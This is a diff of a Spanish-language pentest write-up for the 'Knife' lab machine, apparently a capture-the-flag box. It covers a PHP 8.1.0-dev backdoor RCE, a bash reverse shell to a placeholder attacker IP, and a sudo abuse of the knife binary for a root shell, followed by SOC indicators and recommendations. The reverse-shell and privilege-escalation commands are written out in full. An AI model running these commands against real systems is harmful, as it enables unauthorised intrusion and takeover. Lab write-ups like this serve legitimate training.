@@ -2,35 +2,119 @@
 
 ## 1. Resumen Ejecutivo
 
-Se ha realizado una evaluación de seguridad sobre el host "Knife", identificado como sistema Linux con servicios expuestos en red.
+Se identificó una vulnerabilidad crítica en PHP 8.1.0-dev que permite ejecución remota de código sin autenticación.
 
-Durante el análisis se detectó una vulnerabilidad crítica en una versión de desarrollo de PHP (8.1.0-dev) que contiene una puerta trasera (backdoor), permitiendo ejecución remota de código (RCE) sin autenticación.
-
-Tras obtener acceso inicial, se identificó una mala configuración en los permisos sudo que permitió ejecutar el binario `knife` como root sin contraseña, logrando una escalada completa de privilegios.
+Posteriormente, se abusó de permisos sudo para escalar privilegios a root.
 
 ### Impacto
 
-- Ejecución remota de código sin autenticación
-- Acceso al sistema como usuario válido
-- Escalada de privilegios a root
-- Compromiso total del sistema
+- RCE sin autenticación  
+- Acceso al sistema  
+- Escalada a root  
 
-### Nivel de riesgo: **CRÍTICO**
-
----
-
-## 2. Alcance
-
-- Objetivo: Máquina "Knife"
-- Sistema: Linux (Ubuntu)
-- Tipo de prueba: Black Box
-- Metodología: Enumeración → Explotación → Escalada
+### Riesgo: **CRÍTICO**
 
 ---
 
-## 3. Enumeración
+## 2. Enumeración
 
-### 3.1 Escaneo de puertos
+    nmap -p- -sS --min-rate 5000 -Pn <IP>
 
-```bash
-nmap -p- -sS --min-rate 5000 -Pn <IP>
+Puertos:
+
+- 22 – SSH  
+- 80 – HTTP  
+
+---
+
+## 3. Análisis
+
+Cabecera HTTP:
+
+    PHP/8.1.0-dev
+
+→ versión vulnerable con backdoor  
+
+---
+
+## 4. Explotación
+
+RCE mediante cabecera manipulada.
+
+Resultado:
+
+- Usuario: james  
+
+---
+
+## 5. Reverse shell
+
+    nc -lvnp 4444
+
+    bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1
+
+---
+
+## 6. Escalada de privilegios
+
+    sudo -l
+
+Resultado:
+
+    (root) NOPASSWD: /usr/bin/knife
+
+Exploit:
+
+    echo "system('/bin/bash')" > exploit.rb
+    sudo /usr/bin/knife exec exploit.rb
+
+Resultado:
+
+    uid=0(root)
+
+---
+
+## 7. Visión SOC
+
+### IoC
+
+- Cabeceras HTTP anómalas  
+- Ejecución de comandos desde Apache  
+- Reverse shell  
+- Uso de sudo  
+
+---
+
+### Logs
+
+    /var/log/apache2/access.log
+    /var/log/syslog
+    /var/log/auth.log
+
+---
+
+### MITRE
+
+- T1190  
+- T1059  
+- T1068  
+
+---
+
+## 8. Recomendaciones
+
+- No usar versiones dev  
+- Revisar sudo  
+- Monitorizar ejecución de comandos  
+
+---
+
+## 9. Conclusión
+
+Cadena:
+
+1. RCE  
+2. Shell  
+3. Escalada  
+
+Compromiso total del sistema.
